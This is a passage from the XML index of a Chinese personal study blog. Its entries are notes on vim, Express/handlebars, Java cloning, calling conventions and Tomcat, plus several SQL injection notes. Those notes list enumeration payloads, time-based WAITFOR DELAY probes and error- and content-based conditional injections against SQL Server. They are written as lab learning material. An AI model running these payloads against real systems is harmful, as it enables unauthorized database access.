        <span class="token keyword">let</span> <span class="token keyword">l</span> <span class="token operator">=</span> <span class="token keyword">l</span> <span class="token operator">+</span> <span class="token number">1</span> | <span class="token keyword">call</span> <span class="token function">setline</span><span class="token punctuation">(</span><span class="token keyword">l</span><span class="token punctuation">,</span> <span class="token string">'#include &lt;iostream>'</span><span class="token punctuation">)</span>
        <span class="token keyword">let</span> <span class="token keyword">l</span> <span class="token operator">=</span> <span class="token keyword">l</span> <span class="token operator">+</span> <span class="token number">1</span> | <span class="token keyword">call</span> <span class="token function">setline</span><span class="token punctuation">(</span><span class="token keyword">l</span><span class="token punctuation">,</span> <span class="token string">'#include &lt;cstring>'</span><span class="token punctuation">)</span>
        <span class="token keyword">let</span> <span class="token keyword">l</span> <span class="token operator">=</span> <span class="token keyword">l</span> <span class="token operator">+</span> <span class="token number">1</span> | <span class="token keyword">call</span> <span class="token function">setline</span><span class="token punctuation">(</span><span class="token keyword">l</span><span class="token punctuation">,</span> <span class="token string">'#include &lt;cstdio>'</span><span class="token punctuation">)</span>
        <span class="token keyword">let</span> <span class="token keyword">l</span> <span class="token operator">=</span> <span class="token keyword">l</span> <span class="token operator">+</span> <span class="token number">1</span> | <span class="token keyword">call</span> <span class="token function">setline</span><span class="token punctuation">(</span><span class="token keyword">l</span><span class="token punctuation">,</span> <span class="token string">'#include &lt;cstdlib>'</span><span class="token punctuation">)</span>
        <span class="token keyword">let</span> <span class="token keyword">l</span> <span class="token operator">=</span> <span class="token keyword">l</span> <span class="token operator">+</span> <span class="token number">1</span> | <span class="token keyword">call</span> <span class="token function">setline</span><span class="token punctuation">(</span><span class="token keyword">l</span><span class="token punctuation">,</span> <span class="token string">'using namespace std;'</span><span class="token punctuation">)</span>
    <span class="token keyword">endif</span>
    <span class="token keyword">if</span> &amp;<span class="token keyword">filetype</span> <span class="token operator">==</span> <span class="token string">"c"</span>
        <span class="token keyword">let</span> <span class="token keyword">l</span> <span class="token operator">=</span> <span class="token keyword">l</span> <span class="token operator">+</span> <span class="token number">1</span> | <span class="token keyword">call</span> <span class="token function">setline</span><span class="token punctuation">(</span><span class="token keyword">l</span><span class="token punctuation">,</span> <span class="token string">'#include &lt;stdio.h>'</span><span class="token punctuation">)</span>
        <span class="token keyword">let</span> <span class="token keyword">l</span> <span class="token operator">=</span> <span class="token keyword">l</span> <span class="token operator">+</span> <span class="token number">1</span> | <span class="token keyword">call</span> <span class="token function">setline</span><span class="token punctuation">(</span><span class="token keyword">l</span><span class="token punctuation">,</span> <span class="token string">'#include &lt;string.h>'</span><span class="token punctuation">)</span>
        <span class="token keyword">let</span> <span class="token keyword">l</span> <span class="token operator">=</span> <span class="token keyword">l</span> <span class="token operator">+</span> <span class="token number">1</span> | <span class="token keyword">call</span> <span class="token function">setline</span><span class="token punctuation">(</span><span class="token keyword">l</span><span class="token punctuation">,</span> <span class="token string">'#include &lt;stdlib.h>'</span><span class="token punctuation">)</span>
    <span class="token keyword">endif</span>
endfunc

inoremap <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&lt;</span>Esc<span class="token operator">></span>i
inoremap <span class="token punctuation">{</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token operator">&lt;</span>Esc<span class="token operator">></span>i<span class="token operator">&lt;</span>CR<span class="token operator">></span><span class="token operator">&lt;</span>Esc<span class="token operator">></span>
inoremap <span class="token punctuation">[</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">&lt;</span>Esc<span class="token operator">></span>i
inoremap <span class="token string">" "</span><span class="token comment" spellcheck="true">"&lt;Esc>i</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
]]></content>
      
        
        <tags>
            
            <tag> 周五 </tag>
            
            <tag> vim </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[todo]]></title>
      <url>/2016/11/01/todo/</url>
      <content type="html"><![CDATA[<ol>
<li>TDD &amp; BDD</li>
<li>about <a href="http://www.ruanyifeng.com/blog/2016/09/react-technology-stack.html" target="_blank" rel="external">react</a></li>
<li>express</li>
<li>sqli-labs</li>
<li>wechall</li>
<li>source code of EOS</li>
<li>csrf &amp; ssrf</li>
<li>geek &amp; sycsec =&gt; wp</li>
<li>xss</li>
</ol>
]]></content>
      
        
        <tags>
            
            <tag> todo </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[关于handlebars模板后缀名]]></title>
      <url>/2016/11/01/%E5%85%B3%E4%BA%8Ehandlebars%E6%A8%A1%E6%9D%BF%E5%90%8E%E7%BC%80%E5%90%8D/</url>
      <content type="html"><![CDATA[<p>express使用模板引擎handlebars时候，默认模板的后缀为#.handlebars#,发现直接替换了handlebars传入对象中的extname，仍然会报错</p>
<pre class="line-numbers language-bash"><code class="language-bash">Failed to lookup view <span class="token string">"home"</span> <span class="token keyword">in</span> views directory <span class="token string">"/home/***/projectName/views"</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<blockquote>
<p>报错代码</p>
</blockquote>
<pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> handlebars <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express3-handlebars'</span><span class="token punctuation">)</span>
  <span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token punctuation">{</span>defaultLayout<span class="token punctuation">:</span> <span class="token string">'main'</span><span class="token punctuation">,</span> extname<span class="token punctuation">:</span> <span class="token string">'.hbs'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


<span class="token keyword">var</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
app<span class="token punctuation">.</span><span class="token function">engine</span><span class="token punctuation">(</span><span class="token string">'handlebars'</span><span class="token punctuation">,</span> handlebars<span class="token punctuation">.</span>engine<span class="token punctuation">)</span><span class="token punctuation">;</span>
app<span class="token punctuation">.</span><span class="token keyword">set</span><span class="token punctuation">(</span><span class="token string">'view engine'</span><span class="token punctuation">,</span> <span class="token string">'handlebars'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>后来发现。。。居然同时还要写成这样子。。才可以</p>
<pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> handlebars <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express3-handlebars'</span><span class="token punctuation">)</span>
  <span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token punctuation">{</span>defaultLayout<span class="token punctuation">:</span> <span class="token string">'main'</span><span class="token punctuation">,</span> extname<span class="token punctuation">:</span> <span class="token string">'.hbs'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


<span class="token keyword">var</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
app<span class="token punctuation">.</span><span class="token function">engine</span><span class="token punctuation">(</span><span class="token string">'hbs'</span><span class="token punctuation">,</span> handlebars<span class="token punctuation">.</span>engine<span class="token punctuation">)</span><span class="token punctuation">;</span>
app<span class="token punctuation">.</span><span class="token keyword">set</span><span class="token punctuation">(</span><span class="token string">'view engine'</span><span class="token punctuation">,</span> <span class="token string">'hbs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
]]></content>
      
        
        <tags>
            
            <tag> node </tag>
            
            <tag> handlebars </tag>
            
            <tag> express </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[wechall|Blinded by the light]]></title>
      <url>/2016/10/14/wechall-Blinded-by-the-light/</url>
      <content type="html"><![CDATA[<p>hack点</p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">blightVuln</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
        <span class="token shell-comment comment"># Do not mess with other sessions!</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">,</span> <span class="token string">'/*'</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">,</span> <span class="token string">'blight'</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
                <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token variable">$db</span> <span class="token operator">=</span> <span class="token function">blightDB</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$sessid</span> <span class="token operator">=</span> GWF_Session<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">getSession</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getID</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$query</span> <span class="token operator">=</span> <span class="token string">"SELECT 1 FROM (SELECT password FROM blight WHERE sessid=$sessid) b WHERE password='$password'"</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">queryFirst</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这一句</p>
<pre class="line-numbers language-sql"><code class="language-sql"><span class="token string">"SELECT 1 FROM (SELECT password FROM blight WHERE sessid=$sessid) b WHERE password='$password'"</span><span class="token punctuation">;</span>
<span class="token string">")"</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>开始不理解 b的意思<br>后来反应过来是前面的临时表(SELECT password FROM blight WHERE sessid=$sessid)的别名 省去了 AS<br>不加这个的话 就会报错:<br> Every derived table must have its own alias   </p>
<p>另外 此题不会做<br>题解:<br><a href="http://1176518111.blog.51cto.com/9678787/1693484/" target="_blank" rel="external">题解～～～</a></p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[underscore]]></title>
      <url>/2016/10/09/underscore/</url>
      <content type="html"><![CDATA[<blockquote>
<p>Underscore is a JavaScript library that provides a whole mess of useful functional programming helpers without extending any built-in objects.</p>
</blockquote>
<p>node 里 这样 用就行啦</p>
<pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">//example.js</span>
<span class="token keyword">var</span> _ <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'../underscore'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">function</span> <span class="token function">unsplat</span><span class="token punctuation">(</span>fun<span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">return</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> fun<span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> _<span class="token punctuation">.</span><span class="token function">toArray</span><span class="token punctuation">(</span>arguments<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">var</span> joinElement <span class="token operator">=</span> <span class="token function">unsplat</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span>array<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">return</span> array<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">var</span> res <span class="token operator">=</span> <span class="token function">joinElement</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">//=>"1 2"</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
]]></content>
      
        
        <tags>
            
            <tag> javascript </tag>
            
            <tag> 函数式 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[函数调用惯例]]></title>
      <url>/2016/10/07/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%83%AF%E4%BE%8B/</url>
      <content type="html"><![CDATA[<p>在这里mark一下</p>
<table>
<thead>
<tr>
<th>-</th>
<th>CDECL</th>
<th>STDCALL</th>
<th>FASTCALL</th>
</tr>
</thead>
<tbody>
<tr>
<td>参数</td>
<td>从左向右压栈<br>调用方负责在掉用后清理栈</td>
<td>与CDECL相同<br>除了被调用方清理栈</td>
<td>前两个参数通过ECX和EDX传递<br>其余压入栈</td>
</tr>
<tr>
<td>返回值</td>
<td>保存在EAX</td>
<td>保存在EAX</td>
<td>保存在EAX</td>
</tr>
<tr>
<td>非易失寄存器</td>
<td>EBP,ESP,EBX,ESI,EDI</td>
<td>EBP,ESP,EBX,ESI,EDI</td>
<td>EBP,ESP,EBX,ESI,EDI</td>
</tr>
</tbody>
</table>
]]></content>
      
        
        <tags>
            
            <tag> 周五 </tag>
            
            <tag> 国庆 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[SQLi-杂]]></title>
      <url>/2016/09/23/SQLi-%E6%9D%82/</url>
      <content type="html"><![CDATA[<ol>
<li><p>识别数据库版本一般就是 引入@@version 变量之类的 把他放在一个奇异的地方然后让他报错</p>
</li>
<li><p>识别列数的两种方法</p>
<ul>
<li>使用 union 查询<ul>
<li>当结果只能返回一行我们该如何做<br>  ?id = ‘a’ and 1 = 2 union select balabala…(让前面查询永为假)</li>
<li>为了防止类型不匹配 我们可以用null</li>
<li>得到列数后, 可以用字符串or数字分别替换null,不报错即得到数据类型</li>
</ul>
</li>
<li>使用 order by id</li>
</ul>
</li>
<li><p>对于oracle这种必须得有from子句的sql方言,可以让他from dual</p>
</li>
<li><p>SQL server提供了比其他DBMS更加详尽的信息<br> ?id=2<br> =&gt; ?id=system_user 类型转换错误 可能会爆system_user的值<br> =&gt; ?id=0/@@version 同理<br> =&gt; ?id=char(65 + is_srvrolemember(‘sysadmin’)) 仍然同理</p>
<p> =&gt; ?id=1 having 1 = 1 爆出第一列列名 如poducts.id<br> =&gt; ?id=1 group by products.id having 1 = 1 爆出第二列列名 如products.name<br> =&gt; …</p>
</li>
</ol>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[我还没放弃学英语呢]]></title>
      <url>/2016/09/23/%E6%88%91%E8%BF%98%E6%B2%A1%E6%94%BE%E5%BC%83%E5%AD%A6%E8%8B%B1%E8%AF%AD%E5%91%A2/</url>
      <content type="html"><![CDATA[<ul>
<li>and enjoy  d听不到 en也听不到</li>
<li>open up  连读</li>
<li>‘s 听不到</li>
<li>keep it 连读</li>
</ul>
]]></content>
      
        <categories>
            
            <category> 日记 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 周五 </tag>
            
            <tag> 学习 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[SQLi-使用条件语句]]></title>
      <url>/2016/09/23/SQLi/</url>
      <content type="html"><![CDATA[<table>
<thead>
<tr>
<th>数据库</th>
<th>查询</th>
</tr>
</thead>
<tbody>
<tr>
<td>SQL Server</td>
<td>IF(‘a’ = ‘a’)SELECT 1 ELSE SELECT 2</td>
</tr>
<tr>
<td>MySQL</td>
<td>SELECT IF(‘a’, 1, 2)</td>
</tr>
<tr>
<td>Oracle</td>
<td>SELECT CASE WHEN ‘a’ = ‘a’ THEN 1 ELSE 2</td>
</tr>
<tr>
<td>PostgreSQL</td>
<td>SELECT CASE WHEN(1 = 1) THEN ‘a’ ELSE ‘b’ END</td>
</tr>
</tbody>
</table>
<ol>
<li>基于时间的注入(感觉速度会很慢？)<ul>
<li>如果满足条件就延迟5s(或其他时间)<pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">IF</span> <span class="token punctuation">(</span><span class="token keyword">system_user</span> <span class="token operator">=</span> <span class="token string">'sa'</span><span class="token punctuation">)</span> <span class="token keyword">WAITFOR</span> DELAY <span class="token string">'0:0:5'</span>
<span class="token keyword">IF</span> <span class="token punctuation">(</span>substring<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> @<span class="token variable">@version</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token keyword">WAITFOR</span> DELAY <span class="token string">'0:0:5'</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
</li>
</ul>
</li>
<li>基于错误的注入<ul>
<li>比如除0<pre><code>  ?id=12 / is_srvrolemember(&#39;sysadmin&#39;)
</code></pre></li>
</ul>
</li>
<li>基于内容的注入<ul>
<li>比如<pre class="line-numbers language-url"><code class="language-url">  porducts.asp?id = 12 + (case when (system_user = 'sa') then 1 else 0 end)
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
  条件成功返回id=13的商品, 否则返回id=12的</li>
</ul>
</li>
</ol>
]]></content>
      
        
        <tags>
            
            <tag> 周五 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[搭了sqli-labs]]></title>
      <url>/2016/09/22/%E6%90%AD%E4%BA%86sqli-labs/</url>
      <content type="html"><![CDATA[<p>搭了sqli-labs 在8888端口</p>
]]></content>
      
        
        <tags>
            
            <tag> 周四 </tag>
            
            <tag> 好久不记东西 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[JSP隐式对象]]></title>
      <url>/2016/07/26/JSP%E9%9A%90%E5%BC%8F%E5%AF%B9%E8%B1%A1/</url>
      <content type="html"><![CDATA[<p>呐~</p>
<table>
<thead>
<tr>
<th>对象</th>
<th>类型</th>
</tr>
</thead>
<tbody>
<tr>
<td>request</td>
<td>javax.servlet.http.HttpServletRequest</td>
</tr>
<tr>
<td>response</td>
<td>javax.servlet.http.HttpServletResponse</td>
</tr>
<tr>
<td>out</td>
<td>javax.servlet.jsp.JspWriter</td>
</tr>
<tr>
<td>session</td>
<td>javax.servlet.http.HttpSession</td>
</tr>
<tr>
<td>application</td>
<td>javax.servlet.ServletContext</td>
</tr>
<tr>
<td>config</td>
<td>javax.servlet.ServletConfig</td>
</tr>
<tr>
<td>pageContext</td>
<td>javax.servlet.jsp.PageContext</td>
</tr>
<tr>
<td>page</td>
<td>javax.servlet.jsp.HttpJspPage</td>
</tr>
<tr>
<td>exception</td>
<td>java.lang.Throwable</td>
</tr>
</tbody>
</table>
]]></content>
      
        
        <tags>
            
            <tag> web </tag>
            
            <tag> java </tag>
            
            <tag> jsp </tag>
            
            <tag> 周二 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[java|shallow copy & deep cpoy]]></title>
      <url>/2016/07/18/java-shallow-copy-deep-cpoy/</url>
      <content type="html"><![CDATA[<p>在对象复制一节引出的</p>
<p>对象可以使用Object类的<code>clone()</code>方法来建立自己的副本</p>
<p>为了使自己是可复制的(cloneable), 要实现<code>java.lang.Cloneable</code>接口</p>
<p>另外，clone方法是protect，默认的，只能由对象自身，同一个包中的对象或者同类型(或者其子类型)的对象所调用。如果希望对任何对象来说都是可复制的，就必须覆盖其clone()方法，并申明为public。</p>
<pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>HashMap<span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Sheep</span> <span class="token keyword">implements</span> <span class="token class-name">Cloneable</span><span class="token punctuation">{</span>

    HashMap flock <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> Object <span class="token function">clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">CloneNotSupportedException</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">"This should never happen because we implement Cloneable"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>但这样在clone时候需要强制类型转换一下</p>
<pre class="line-numbers language-java"><code class="language-java">Sheep one <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Sheep</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
Sheep anotherOne <span class="token operator">=</span> <span class="token punctuation">(</span>Sheep<span class="token punctuation">)</span>one<span class="token punctuation">.</span><span class="token function">clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>如果这样写</p>
<pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> Sheep <span class="token function">clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">try</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token punctuation">(</span>Sheep<span class="token punctuation">)</span><span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">CloneNotSupportedException</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">"This should never happen because we implement Cloneable"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>就可以写成这样啦</p>
<pre class="line-numbers language-java"><code class="language-java">Sheep one <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Sheep</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
Sheep anotherOne <span class="token operator">=</span> one<span class="token punctuation">.</span><span class="token function">clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>上面涉及到的都是<em>浅拷贝</em><br>即one和anotherOne的flock会指向<em>同一个对象</em></p>
<p>然而，你可以手动<em>深拷贝</em>一下，让大家都有属于自己的HashMap.</p>
<pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Sheep</span> <span class="token keyword">implements</span> <span class="token class-name">Cloneable</span><span class="token punctuation">{</span>

    HashMap flock <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> Object <span class="token function">clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            DeepSheep copy <span class="token operator">=</span> <span class="token punctuation">(</span>DeepSheep<span class="token punctuation">)</span><span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            copy<span class="token punctuation">.</span>flock <span class="token operator">=</span> <span class="token punctuation">(</span>HashMap<span class="token punctuation">)</span>flock<span class="token punctuation">.</span><span class="token function">clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> copy<span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">CloneNotSupportedException</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">"This should never happen~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>完结～</p>
]]></content>
      
        
        <tags>
            
            <tag> java </tag>
            
            <tag> 周一 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[java匿名内部类]]></title>
      <url>/2016/07/18/java%E5%8C%BF%E5%90%8D%E5%86%85%E9%83%A8%E7%B1%BB/</url>
      <content type="html"></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[关于Java]]></title>
      <url>/2016/07/18/%E5%85%B3%E4%BA%8EJava/</url>
      <content type="html"><![CDATA[<p>作为一条通用规则，类在范围的封装和受限层次越深，对其命名的自由度也越大(什么意思。。)</p>
]]></content>
      
        
        <tags>
            
            <tag> 周一 </tag>
            
            <tag> Java </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[java的内部类和方法里的内部类]]></title>
      <url>/2016/07/18/java%E7%9A%84%E5%86%85%E9%83%A8%E7%B1%BB%E5%92%8C%E6%96%B9%E6%B3%95%E9%87%8C%E7%9A%84%E5%86%85%E9%83%A8%E7%B1%BB/</url>
      <content type="html"></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[奇怪的Tomcat]]></title>
      <url>/2016/07/15/%E5%A5%87%E6%80%AA%E7%9A%84Tomcat/</url>
      <content type="html"><![CDATA[<p>整个安装路径都是奇怪的</p>
<a id="more"></a>
<pre><code>It works !

    If you&#39;re seeing this page via a web browser, it means you&#39;ve setup Tomcat successfully. Congratulations!

    This is the default Tomcat home page. It can be found on the local filesystem at: /var/lib/tomcat8/webapps/ROOT/index.html

    Tomcat8 veterans might be pleased to learn that this system instance of Tomcat is installed with CATALINA_HOME in 
/usr/share/tomcat8 and CATALINA_BASE in /var/lib/tomcat8, following the rules from /usr/share/doc/tomcat8-common/RUNNING.txt.gz.

    You might consider installing the following packages, if you haven&#39;t already done so:

    NOTE: For security reasons, using the manager webapp is restricted to users with role &quot;manager-gui&quot;. The host-manager webapp
is restricted to users with role &quot;admin-gui&quot;. Users are defined in /etc/tomcat8/tomcat-users.xml.
</code></pre>]]></content>
      
        <categories>
            
            <category> 日记 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 周五 </tag>
            
            <tag> Tomcat </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[gvfsd-smb-browse CPU 100%]]></title>
      <url>/2016/07/15/gvfsd-smb-browse-CPU-100/</url>
      <content type="html"><![CDATA[<p>不是很懂这个坑爹的gvfs，kill掉一会儿就又100%，然后听到风扇声音大，多半就是这个</p>
<p><a href="https://bugzilla.redhat.com/show_bug.cgi?id=1303300" target="_blank" rel="external">redhat的解决方法</a></p>
<ol>
<li>sudo vim /etc/samba/smb.conf</li>
</ol>
<ol>
